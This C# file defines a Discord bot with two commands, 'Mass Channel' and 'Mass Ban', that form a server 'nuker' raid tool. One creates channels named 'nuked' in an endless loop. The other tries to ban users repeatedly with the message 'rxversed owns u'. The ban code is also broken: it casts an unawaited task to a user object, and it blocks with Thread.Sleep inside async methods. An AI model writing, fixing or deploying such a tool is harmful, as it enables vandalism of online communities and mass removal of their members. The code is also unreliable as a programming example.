using Discord.Commands;
using System;
using System.Threading;
using System.Threading.Tasks;

namespace DotNetNuker.Commands
{
    public class MassChannel : ModuleBase
    {

        [Command("Mass Channel", RunMode = RunMode.Async)]

        public async Task RunMassChannel()
        {
            await ReplyAsync("Alright!");
            
            
            for (; ; )
            {
                await Context.Guild.CreateTextChannelAsync("nuked");

                Thread.Sleep(50);
            }

           
        }
    }

    public class MassBan : ModuleBase
    {
        [Command("Mass Ban", RunMode = RunMode.Async)]

        public async Task RunMassDelete()
        {
            await ReplyAsync("Okey Dokey!");


            for (; ; )
            {
                var users = Context.Guild.GetUsersAsync();
                await Context.Guild.AddBanAsync((Discord.IUser)users, 0, "rxversed owns u");
                
                Thread.Sleep(50);
            }
        }
    }
}
